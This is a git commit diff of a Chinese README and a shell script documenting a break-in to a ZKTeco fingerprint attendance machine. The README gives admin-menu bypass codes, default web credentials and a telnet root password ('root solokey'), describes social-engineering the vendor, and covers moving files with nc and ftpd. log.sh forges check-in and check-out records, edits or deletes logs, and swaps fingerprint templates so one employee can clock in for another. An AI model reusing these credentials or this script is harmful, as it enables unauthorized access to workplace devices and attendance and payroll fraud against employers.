696fcdc65d6f482f0c60a21547073d465b180993
vi5i0n <vi5i0n@hotmail.com>
2017-01-10 10:21:26 +0800

    updatge

--- zkteco_check_in/README.md
+++ zkteco_check_in/README.md
@@ -8,37 +8,43 @@
 - RS232/485
 - USB Host/client
 - TCP/IP 客户端软件
-- Web3.0
+- Web 3.0
 - Telnet(开发人员)
 
-### 机身自带管理功能
+下面来细说这几种方式：
+
+#### 1. 机身自带管理功能
 这里根据官方帮助<http://cn.zkteco.com/server01_detail/newsId=146.html>
-#### 黑白屛机器
+
+##### 1.1 黑白屏机器
 按菜单键输入9999>>>按“上”键>>>8888>>>再按“上”键，指纹机右上方会显示一个随机的数字，将这个数字记下来求和，并输入一个四位数，首（千）位是７，百位是随机的数和的首位，十位是0，个位是随机的数和的未位。如和是一位的个位也是0，再按“上”键和菜单键即可进入设置界面，这个过程不能太长，太长的话就失效了。进入设置菜单将管理员的权限清除掉即可。
-#### 彩屏机器
+
+##### 1.2 彩屏机器
 彩屏须在1分钟内操作完成，记下机器时间，用计算器算9999-机器显示时间的差的平方，就是密码。例如：目前考勤机时间是22：55，那就是9999-2255=7744，接着算7744的平方，7744*7744=59969536 ，考勤机8888的管理密码就是59969536。按菜单键，在指纹机上输入8888>>>按OK键，输入计算出来的密码 OK。
 
-### RS232/485 串口线连接
-具体方法及参数可以看说明书
 
+#### 2. RS232/485 串口线连接
+具体方法及参数可以看说明书
 默认通讯密码：0 （也就是空密码）
 
-### USB 连接方式
+#### 3. USB 连接方式
 通过自带管理通过u盘把数据导入或导出。
 
-### TCP/IP 客户端软件
+#### 4. TCP/IP 客户端软件
 通过软件来同步导出数据，行政貌似就是这么干的。
 对了，官方说明传输数据并没有加密,但是在这动手脚，意义并不大。
 
-### Web 3.0
-给了一个http的方式，管理员可以通过web来查询考勤记录，员工貌似也可以登录查看自己的记录。
+#### 5. Web 3.0
+给了一个 http 的方式，管理员可以通过web来查询考勤记录，员工貌似也可以登录查看自己的记录。
 默认超管账号及密码
 
     user:administrator;
     password: 123456;
 
-### telnet
-这个方式应该是开发人员用的，根据介绍得知，该机器基于linux，如果我们拿下这个telnet ，我们就获得了最高权限，那时候我们想怎么玩就怎么玩了。
+#### telnet
+这个方式应该是开发人员用的，根据介绍得知，该机器基于 linux，如果我们拿下这个 telnet ，我们就获得了最高权限，那时候我们想怎么玩就怎么玩了。
+
+______
 
 ## 思路
 对过以上几种方式的分析，数据是记录在机器里，为了签到，我们只能通过telnet方式
@@ -51,14 +57,20 @@
     Kernel 3.0.8 on an MIPS
     (none) login: 
 
-简单的尝试后失败了，根据<http://lcx.cc/index.asp?i=3568> 和<<http://blog.infobytesec.com/2014/07/perverting-embedded-devices-zksoftware_2920.html>
+简单的尝试后失败了.
+
+根据<http://lcx.cc/index.asp?i=3568> 和<<http://blog.infobytesec.com/2014/07/perverting-embedded-devices-zksoftware_2920.html>
 
 在评论区中翻到：
-telnet 密码貌似跟出厂时间及机器型号都是有相关的。这个是开发人员设定的。
+>telnet 密码貌似跟出厂时间及机器型号都是有相关的。这个是开发人员设定的。
 
-最后我动了社会工程学，以公司管理员的身份向售后咨询密码，可惜到目前都没有回复我。
+我动了社会工程学，以公司管理员的身份向售后咨询密码，可惜到目前都没有回复我。
 
-最后用 评论区中的`root solokey`成功进入到系统。显然是root，剩下的就自由发挥了。
+最后用 评论区中的`root solokey`成功进入到系统。
+
+id 显然是 root，剩下的就自由发挥了。
+
+-----
 
 ## 打卡及修改打卡时间
 进入系统就是一阵乱找，在`/mnt/mtdblock`下找到我们想要的东西
@@ -71,16 +83,16 @@ telnet 密码貌似跟出厂时间及机器型号都是有相关的。这个是�
 
 `data` 目录下`ZKDB.db`就是我们想要的。
 
-### 数据
-### 下载上传
-初步思路时，下载db文件本地,来打开研究，并修改，然后再上传替换。
-下载好说，不是提供了一个web3.0么，把db 复制到web目录下不就Okay了嘛。
+### 1. 数据
+#### 1.1 下载与上传
+初步思路时，下载 db 文件本地,来打开研究，并修改，然后再上传替换。
+下载好说，不是提供了一个web3.0么，把 db 复制到 web 目录下不就 Okay 了嘛。
 
-上传呢，这个系统是个精简版的系统，仅集成了busybox，命令少的可怜，scp就不要想了。
+上传呢，这个系统是个精简版的系统，仅集成了 busybox，命令少的可怜，scp 就不要想了。
 
-不过找了命令，发现支持ftp，tfpd，nc，所以这个就简单了。
+不过找了命令，发现支持 ftp，tfpd，nc，所以这个就简单了。
 
-#### ftp
+##### ftp
 
     tcpsvd -vE 0.0.0.0 21 ftpd -w /mnt/mtdblock/
 
@@ -88,36 +100,37 @@ telnet 密码貌似跟出厂时间及机器型号都是有相关的。这个是�
 
 但是这货上传的文件用vi打开后面有个`^M`,很是不舒服。
 
-#### nc
+##### nc
 
 发送端：
 
     cat log.sh| nc -l -p 6666
-    或者nc -l  -p 6666 < log.sh                   有些版本不要在 -p
+    或者nc -l  -p 6666 < log.sh                   # 有些版本不要在 -p
 
-【监听6666端口，等待连接】（设发送端IP为10.20.133.152）
+【监听6666端口，等待连接】（设发送端IP为 192.168.2.123 6666）
 
 接收端：
 
-    nc 192.168.2.201 6666 > log.sh
+    nc 192.168.2.123 6666 > log.sh
 
 如上面的操作，即可将文件log.sh从发送端传送到接收端，保存为log.sh
 
-#### tftp
+##### tftp
 
 这个我没测试，可以通过`/etc/inetd.conf`来启动
 
-### 数据及修改
-这个db文件实际上就是sqlite3，用`sqlitebrowser`打开发现，表的结构还是有点多，我只说关键的，
+### 2. 数据及修改
+这个db文件实际上就是 sqlite3，用`sqlitebrowser`打开发现，表的结构还是有点多，我只说关键的这两个表，
 
-* ATT_LOG:签到数据
-* USER_INFO:用户信息
+* ATT_LOG: 签到数据
+* USER_INFO: 用户信息
+* fptemplate10: 指纹信息
 
-很幸运的在data目录下又找到`sqlite3_mips`，可以直接操作db文件，所以想修改数据简直是轻而易举了。
+很幸运的在data目录下又找到`sqlite3_mips` 可执行程序，可以直接操作 db 文件，所以想修改数据简直是轻而易举了。
 
 剩下的就是写个签到脚本了。
 
-### 自动签到
+### 3. 自动签到
 虽然精简但是还是提供了`crontab`这个定时任务，只是执行时会提示错误：
 
     crontab: chdir(/var/spool/cron/crontabs): No such file or directory
@@ -128,23 +141,34 @@ telnet 密码貌似跟出厂时间及机器型号都是有相关的。这个是�
 
 然后就可以用了，写个定时脚本，每天定时签到，永不迟到。
 
+----
+
 ## 进阶玩法
 
 1. 上传图片及声音文件，告别丑陋的出厂图，让机器更个性．
 2. 写个api接口，手机签到.
-3. 替换指纹数据，帮别人打卡（入职时一般是录了两个指纹）
+3. 替换指纹数据，帮别人打卡（入职时一般会录两个指纹）
+
+----
 
 ## 代码
-github:<https://github.com/vi5i0n/pyscripts/tree/master/zkteco_check_in>
+github:<https://github.com/linsir/pyscripts/tree/master/zkteco_check_in>
 
-使用方法：把log.sh上传到`/mnt/mtdblock/data`下执行即可。
+使用方法：把`log.sh`上传到`/mnt/mtdblock/data`下执行即可。
 
-    bash log.sh checkin [ID]
-    bash log.sh change
-
+```
+Usage: 1. bash log.sh query Name: Query [name]'s user_id.
+       2. bash log.sh checkin user_id: Check in for [user_id]'s user.
+       3. bash log.sh checkout user_id: Check out for [user_id]'s user.
+       4. bash log.sh change: Change checkin time of current month.
+       5. bash log.sh change time (2016-06-06T16:03:50): Change checkin [time] of current month with time.
+       6. bash log.sh del : Delete the [log_id]'s checkin log.
+       7. bash log.sh help ID1 ID2 [fingerid]: Use [ID1] 's finger([fingerid]) help [ID2] to checkin.' 
+```
 
 all done,enjoy it .
 
+----
 ##  参考地址：
 1. <http://cn.zkteco.com/service01.html>
 2. http://lcx.cc/?i=3568
--- zkteco_check_in/log.sh
+++ zkteco_check_in/log.sh
@@ -8,6 +8,34 @@
 
 PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
 export PATH
+#====================== log ======================
+
+RED='\033[31m'   # 红
+GREEN='\033[32m' # 绿
+YELLOW='\033[33m' # 黄
+BLUE='\033[34m'  # 蓝
+PINK='\033[35m'  # 粉红
+ADD='\033[0m'
+
+function log_info() {
+    NOW=$(date +"%Y-%m-%d %H:%M:%S")
+    echo -e "${NOW}${BLUE} [INFO] ${ADD} $1"
+}
+
+function log_warnning() {
+    NOW=$(date +"%Y-%m-%d %H:%M:%S")
+    echo -e "${NOW}${YELLOW} [WARNNING] ${ADD} $1"
+    echo -e "${NOW} [WARNNING] $1"
+}
+
+function log_error() {
+    NOW=$(date +"%Y-%m-%d %H:%M:%S")
+    echo -e "${NOW}${RED} [ERROR] ${ADD} $1"
+}
+
+function log_line() {
+    echo "#############################################################"
+}
 
 # 随机生成范围的数字
 function rand(){
@@ -17,90 +45,99 @@ function rand(){
 }
 
 function del_log(){
-    echo "==========================="
+    # Useage:
+    # del_log [log_id]
     log_id=$1
+    log_line
     old_time=`./sqlite3_mips ZKDB.db "SELECT Verify_Time FROM ATT_LOG WHERE ID = '${log_id}';"`
     user_id=`./sqlite3_mips ZKDB.db "SELECT User_PIN FROM ATT_LOG WHERE ID = '${log_id}';"`
     if [ "${user_id}" = "" ]; then
-        echo -e "[\033[31;1mError\033[0m]: Bad [log_id], please try again"
+        log_error "Bad [${RED}log_id${ADD}], please try again"
         menu
         exit
     fi
     name=`./sqlite3_mips ZKDB.db "SELECT Name FROM USER_INFO WHERE User_PIN = '${user_id}'"`
-    echo -e "Are you sure delete the log: [\033[32;1m${name}: ${old_time}\033[0m] "
+    echo -e "Are you sure delete the log: [${GREEN}${name}: ${old_time}${ADD}] "
     read -rsp $'Press enter to continue...or Press Ctrl+C to cancel\n'
     ./sqlite3_mips ZKDB.db "DELETE FROM ATT_LOG WHERE ID = '${log_id}'"
-    echo -e "[\033[32;1mDelete Sucessfuly\033[0m]"
+    echo -e "[${GREEN}Delete Sucessfuly${ADD}]"
     ./sqlite3_mips ZKDB.db ".quit"
 }
 
 function query_id(){
-    echo "==========================="
+    # Useage:
+    # query_id [name]
     name=$1
+    log_line
     user_id=`./sqlite3_mips ZKDB.db "SELECT User_PIN FROM USER_INFO WHERE NAME = '${name}'"`
     if [ "${user_id}" = "" ]; then
-        echo -e "[\033[31;1mError\033[0m]: Bad [name], please try again"
+        log_error "Bad [${RED}name${ADD}], please try again"
         menu
         exit
     fi
-    echo -e "[\033[32;1m${name}\033[0m]'s ID is [\033[32;1m${user_id}\033[0m] "
+    echo -e "[${GREEN}${name}${ADD}]'s ID is [${GREEN}${user_id}${ADD}] "
     ./sqlite3_mips ZKDB.db ".quit"
 }
 
 function check_in(){
-    echo "==========================="
+    # Useage:
+    # check_in [user_id]
     user_id=$1
+    log_line
     name=`./sqlite3_mips ZKDB.db "SELECT Name FROM USER_INFO WHERE User_PIN = '${user_id}'"`
     if [ "${name}" = "" ]; then
-        echo -e "[\033[31;1mError\033[0m]: Bad [user_id], please try again"
+        log_error "Bad [${RED}user_id${ADD}], please try again"
         menu
         exit
     fi
-    echo -e "签到用户: [\033[32;1m${name}\033[0m]"
 
     today=$(date '+%Y-%m-%d')
 
     new_time="08:"$(rand 55 59)":"$(rand 10 59)
     DateTime=$today"T"$new_time
 
-    echo -e "the datetime:[\033[32;1m${DateTime}\033[0m]"
-    read -rsp $'Press enter to continue...or Press Ctrl+C to cancel\n'
+    # log_info "签到用户: [${GREEN}${name}${ADD}]"
+    # log_info "the datetime:[${GREEN}${DateTime}${ADD}]"
+    # read -rsp $'Press enter to continue...or Press Ctrl+C to cancel\n'
 
-    # echo "签到时间: ${DateTime}"
     ./sqlite3_mips ZKDB.db "INSERT INTO ATT_LOG VALUES (null,'${user_id}',15,'${DateTime}','0','0',null,null,null,null,0);"
     save_time=`./sqlite3_mips ZKDB.db "SELECT Verify_Time FROM ATT_LOG WHERE User_PIN = '${user_id}' ORDER BY ID DESC LIMIT 0,1;"`
-    echo -e "[\033[32;1m${name}\033[0m] 签到时间: [\033[32;1m${save_time} Sucessfuly\033[0m]"
+    log_id=`./sqlite3_mips ZKDB.db "SELECT ID FROM ATT_LOG WHERE User_PIN = '${user_id}' ORDER BY ID DESC LIMIT 0,1;"`
+    log_info "LOG_ID: ${GREEN}${log_id}: [${name}${ADD}] 签到时间: [${GREEN}${save_time}${ADD}] Sucessfuly."
     ./sqlite3_mips ZKDB.db ".quit"
 }
 
 function check_out(){
-    echo "==========================="
+    # Useage:
+    # check_out [user_id]
+    log_line
     user_id=$1
     name=`./sqlite3_mips ZKDB.db "SELECT Name FROM USER_INFO WHERE User_PIN = '${user_id}'"`
     if [ "${name}" = "" ]; then
-        echo -e "[\033[31;1mError\033[0m]: Bad [user_id], please try again"
+        log_error "Bad [${RED}user_id${ADD}], please try again"
         menu
         exit
     fi
-    echo -e "签退用户: [\033[32;1m${name}\033[0m]"
 
     today=$(date '+%Y-%m-%d')
 
     new_time="17:"$(rand 35 59)":"$(rand 10 59)
     DateTime=$today"T"$new_time
 
-    echo -e "the datetime:[\033[32;1m${DateTime}\033[0m]"
-    read -rsp $'Press enter to continue...or Press Ctrl+C to cancel\n'
+    # log_info "签退用户: [${GREEN}${name}${ADD}]"
+    # log_info "the datetime:[${GREEN}${DateTime}${ADD}]"
+    # read -rsp $'Press enter to continue...or Press Ctrl+C to cancel\n'
 
     # echo "签到时间: ${DateTime}"
     ./sqlite3_mips ZKDB.db "INSERT INTO ATT_LOG VALUES (null,'${user_id}',15,'${DateTime}','0','0',null,null,null,null,0);"
     save_time=`./sqlite3_mips ZKDB.db "SELECT Verify_Time FROM ATT_LOG WHERE User_PIN = '${user_id}' ORDER BY ID DESC LIMIT 0,1;"`
-    echo -e "[\033[32;1m${name}\033[0m] 签退时间: [\033[32;1m${save_time} Sucessfuly\033[0m]"
+    log_id=`./sqlite3_mips ZKDB.db "SELECT ID FROM ATT_LOG WHERE User_PIN = '${user_id}' ORDER BY ID DESC LIMIT 0,1;"`
+    log_info "LOG_ID: ${GREEN}${log_id}: [${name}${ADD}] 签退时间: [${GREEN}${save_time}${ADD}] Sucessfuly."
     ./sqlite3_mips ZKDB.db ".quit"
 }
 
 function change_log(){
-    echo "==========================="
+    log_line
 
     read -p "请输入签到用户工号(默认用户ID 2055): " user_id
     if [ "${user_id}" = "" ]; then
@@ -108,11 +145,11 @@ function change_log(){
     fi
     name=`./sqlite3_mips ZKDB.db "SELECT Name FROM USER_INFO WHERE User_PIN = '${user_id}'"`
     if [ "${name}" = "" ]; then
-        echo -e "[\033[31;1mError\033[0m]: Bad [user_id], please try again"
+        log_error "Bad [${RED}user_id${ADD}], please try again"
         menu
         exit
     fi
-    echo -e "签到用户: [\033[32;1m${name}\033[0m] (${user_id})"
+    log_info "签到用户: [${GREEN}${name}${ADD}] (${user_id})"
     Month=$(date '+%Y-%m%')
     
     ./sqlite3_mips ZKDB.db "SELECT ID,User_PIN,Verify_Time FROM ATT_LOG WHERE User_PIN = '${user_id}' and Verify_Time like '${Month}';"
@@ -135,33 +172,35 @@ function change_log(){
     fi
     old_time=`./sqlite3_mips ZKDB.db "SELECT Verify_Time FROM ATT_LOG WHERE ID = '${ID}';"`
     if [ "${old_time}" = "" ]; then
-        echo -e "[\033[31;1mError\033[0m]: Bad [log_id], please try again"
+        log_error "Bad [${RED}log_id${ADD}], please try again"
         menu
         exit
     fi
-    echo -e "Are you sure to change [\033[32;1m${old_time}\033[0m] into [\033[32;1m${DateTime}\033[0m]?"
+    echo -e "Are you sure to change [${GREEN}${old_time}${ADD}] into [${GREEN}${DateTime}${ADD}]?"
     read -rsp $'Press enter to continue...or Press Ctrl+C to cancel\n'
 
     ./sqlite3_mips ZKDB.db "UPDATE ATT_LOG SET Verify_Time = '${DateTime}' WHERE ID = '${ID}';"
-    echo -e "[\033[32;1mChange Sucessfuly\033[0m]"
+    echo -e "[${GREEN}Change Sucessfuly${ADD}]"
     # ./sqlite3_mips ZKDB.db "SELECT ID,User_PIN,Verify_Time FROM ATT_LOG WHERE ID = '${ID}';"
     ./sqlite3_mips ZKDB.db ".quit"
 }
 
 function change_finger(){
-    echo "==========================="
+    # Useage:
+    # check_out [old_user_id] help [new_user_id]
+    log_line
     old_user_id=$1
     new_user_id=$2
     finger=$3
     if [ "${old_user_id}" = "" -a "${new_user_id}" = "" ]; then
-        echo -e "[\033[31;1mError\033[0m]: Bad option, please choose again"
+        log_error "Bad option, please choose again"
         menu
         exit
     fi
     old_name=`./sqlite3_mips ZKDB.db "SELECT Name FROM USER_INFO WHERE User_PIN = '${old_user_id}'"`
     new_name=`./sqlite3_mips ZKDB.db "SELECT Name FROM USER_INFO WHERE User_PIN = '${new_user_id}'"`
     if [ "${old_name}" = "" -a "${new_name}" = "" ]; then
-        echo -e "[\033[31;1mError\033[0m]: Bad [ID], please try again"
+        log_error "Bad [${RED}ID${ADD}], please try again"
         menu
         exit
     fi
@@ -174,31 +213,32 @@ function change_finger(){
         finger_id=`./sqlite3_mips ZKDB.db "SELECT ID FROM fptemplate10 WHERE pin = '${old_user_defaulf_id}' and fingerid = '${finger}' "`
     fi
     if [ "${finger_id}" = "" ]; then
-        echo -e "[\033[31;1mError\033[0m]: the user [\033[32;1m${old_name}\033[0m] have no finger data, please try again"
+
+        log_error "the user [${GREEN}${old_name}${ADD}] have no finger data, please try again"
         menu
         exit
     fi
     finger_type=`./sqlite3_mips ZKDB.db "SELECT fingerid FROM fptemplate10 WHERE ID = '${finger_id}'"`
-    echo -e "用户: [\033[32;1m${old_name}\033[0m] => [\033[32;1m${new_name}\033[0m] fingerid([\033[32;1m${finger_type}\033[0m])"
+    log_info "用户: [${GREEN}${old_name}${ADD}] => [${GREEN}${new_name}${ADD}] fingerid([${GREEN}${finger_type}${ADD}])"
     read -rsp $'Press enter to continue...or Press Ctrl+C to cancel\n'
     ./sqlite3_mips ZKDB.db "UPDATE fptemplate10 SET pin = '${new_user_defaulf_id}', fingerid = '1' WHERE ID = '${finger_id}';"
-    echo -e "[\033[32;1mChange Sucessfuly\033[0m]"
+    log_info "[${GREEN}Change Sucessfuly${ADD}]"
     ./sqlite3_mips ZKDB.db ".quit"
 
 }
 function menu(){
-    echo "==========================="
+    log_line
     echo "# @Author  : Linsir (root@linsir.org)"
     echo "# @Link    : http://linsir.org"
-    echo "# @Version : 0.2"
-    echo "Bad option, please choose again"
-    echo "Usage: 1. bash $0 query Name: Query [name]'s user_id."
-    echo "       2. bash $0 checkin user_id: Check in for [user_id]'s user."
-    echo "       3. bash $0 checkout user_id: Check out for [user_id]'s user."
-    echo "       4. bash $0 change: Change checkin time of current month."
-    echo "       5. bash $0 change time (2016-06-06T16:03:50): Change checkin [time] of current month with time."
-    echo "       6. bash $0 del log_id: Delete the log_id's checkin log."
-    echo "       7. bash $0 help ID1 ID2 [fingerid]: Use [ID1]'s finger([fingerid]) help [ID2] to checkin.' "
+    echo "# @Version : 0.3"
+    echo -e "Bad option, please choose again"
+    echo -e "Usage: 1. bash $0 query name: Query [${GREEN}name${ADD}]'s user_id."
+    echo -e "       2. bash $0 checkin user_id: Check in for [${GREEN}user_id${ADD}]'s user."
+    echo -e "       3. bash $0 checkout user_id: Check out for [${GREEN}user_id${ADD}]'s user."
+    echo -e "       4. bash $0 change: Change checkin time of current month."
+    echo -e "       5. bash $0 change time (2016-06-06T16:03:50): Change checkin [${GREEN}time${ADD}] of current month with time."
+    echo -e "       6. bash $0 del log_id: Delete the [${GREEN}log_id${ADD}]'s checkin log."
+    echo -e "       7. bash $0 help ID1 ID2 [fingerid]: Use [${GREEN}ID1${ADD}] 's finger([${GREEN}fingerid${ADD}]) help [${GREEN}ID2${ADD}] to checkin.' "
 }
 
 function Usage(){
